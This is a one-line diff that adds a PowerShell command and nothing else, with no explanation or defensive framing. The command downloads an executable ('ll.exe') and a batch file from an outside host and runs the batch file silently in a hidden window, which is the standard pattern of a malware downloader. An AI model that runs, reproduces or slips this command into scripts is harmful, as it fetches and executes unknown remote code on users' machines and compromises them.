@@ -1,0 +1,1 @@
+$down = New-Object System.Net.WebClient;$down.DownloadFile("http://113795hpv058009.ikexpress.com/ll.exe", "ll.exe"); $url = "http://113795hpv058009.ikexpress.com/testscript.bat"; $file = "testscript.bat"; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file,"all","","",0);
